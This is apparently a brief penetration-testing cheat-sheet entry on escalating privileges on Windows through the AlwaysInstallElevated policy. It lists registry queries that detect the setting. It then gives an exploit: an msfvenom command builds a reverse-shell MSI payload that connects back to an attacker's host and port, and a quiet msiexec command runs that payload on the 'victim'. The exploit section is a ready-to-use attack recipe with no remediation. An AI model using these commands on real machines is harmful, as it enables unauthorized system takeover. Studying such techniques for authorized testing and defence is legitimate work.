04 - alwaysinstallelevated


Vulnerability :

  • every installed package wil be admin

Detection :

◇ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

◇ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

 

Exploit :

  • generate a reverse shell windows install msi

    • msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o reverse.msi

  • on the victim

    • start the installer

    • msiexec /quiet /qn /i C:\$PATH
